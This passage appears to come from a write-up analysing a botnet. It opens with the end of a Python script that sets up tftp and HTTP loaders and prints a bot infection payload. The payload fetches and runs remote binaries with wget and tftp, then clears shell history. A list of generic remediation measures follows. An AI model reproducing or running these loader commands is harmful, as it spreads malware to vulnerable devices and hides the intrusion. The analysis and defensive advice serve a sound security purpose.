    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
run("service xinetd restart")
run("service httpd restart")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')


# print payload for later use
print("\x1b[0;96mpay: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/terror.sh; chmod 777 *; sh terror.sh; tftp -g " + ip + " -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c\x1b[0m")
```


## remediation

a botnet like this isn't particularly unique. there are thousands, if not millions, just like it floating around on the internet, just looking for victims. 

1. **network monitoring and intrusion detection systems (IDS)**: network monitoring involves analyzing network traffic to identify anomalies or suspicious activities. an IDS can automatically detect potential threats based on predefined rules or unusual patterns. for instance, repeated attempts to connect to the same IP address or port, or a sudden spike in outbound traffic, could indicate botnet activity. IDS solutions can be signature-based (detecting known threats) or anomaly-based (detecting deviations from normal behavior).

2. **endpoint protection solutions**: endpoint protection solutions provide a suite of security capabilities for individual devices (endpoints), such as antivirus, antispyware, firewall, and intrusion detection functionalities. they can detect and block malicious activities, including the installation and operation of bot clients. advanced solutions may also include behavioral analysis to detect unknown threats.

3. **firewall configuration**: firewalls can be configured to block outgoing connections to the IP addresses and ports used by the C2 servers. this can be done by setting up outbound rules in the firewall to deny traffic to these addresses and ports. by blocking these connections, the bot client is prevented from receiving commands, effectively neutralizing it.

4. **regular system scans**: regular system scans can help detect the presence of the bot client on the system. antivirus software or other malware detection tools can be used for this purpose. these tools scan the system's files and memory for known malicious signatures or suspicious behavior. if the bot client is detected, it should be removed immediately using the tool's removal function.

5. **user education**: users should be educated about the dangers of downloading and running unknown files, as this is a common way for bot clients to be installed. they should be taught to only download files from trusted sources and to avoid clicking on suspicious links. phishing attempts, which can deliver the bot client via email attachments or malicious links, should also be covered in security awareness training.

6. **software updates and patching**: keeping all systems and software updated with the latest patches is crucial for preventing botnet infections. many bot clients exploit known vulnerabilities in software to gain unauthorized access or escalate privileges. regular updates and patches fix these vulnerabilities, making these exploits ineffective.

7. **access controls**: implementing strict access controls can limit the potential impact of a bot client. this includes using least privilege principles, where users are given the minimum levels of access necessary to perform their duties. this can prevent the bot client from gaining access to sensitive data or critical systems.

8. **incident response plan**: an incident response plan provides a structured approach for dealing with botnet infections. it should include steps for detecting the infection, containing the damage, eradicating the bot client, and recovering from the attack. the plan should also include communication protocols for notifying affected parties and reporting the incident to relevant authorities.
